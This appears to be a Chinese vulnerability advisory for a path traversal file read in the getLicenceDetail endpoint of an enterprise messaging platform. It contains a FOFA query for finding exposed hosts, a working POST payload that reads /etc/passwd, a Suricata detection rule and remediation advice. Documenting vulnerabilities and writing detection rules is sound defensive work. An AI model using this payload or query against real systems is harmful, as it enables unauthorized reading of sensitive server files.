# 企业信息发送平台-getLicenceDetail-文件读取

企业信息发送平台-getLicenceDetail-文件读取，攻击者可进行读取系统内任意敏感信息。

# 影响版本

企业信息发送平台

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：title=="企业信息发送平台"

POC/EXP：

```
POST /getLicenceDetail HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host:127.0.0.1

fileName=../../../../../../etc/passwd
```

![image-20260924152007060](assets/image-20260924152007060.png)

sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"企业信息发送平台 - /getLicenceDetail fileName 路径穿越任意文件读取";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri;
        content:"/getLicenceDetail";
        fast_pattern;
    http.content_type; content:"application/x-www-form-urlencoded";
    http.request_body;
        content:"fileName=";
        content:"../"; distance:0;
        content:"/etc/passwd"; distance:0; nocase;
    metadata:
        service http,
        affected_product "企业信息发送平台",
        vulnerability_type "Path Traversal / Arbitrary File Read",
        severity "high";
    classtype:web-application-attack;
    sid:1000757;
    rev:1;
    priority:1;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
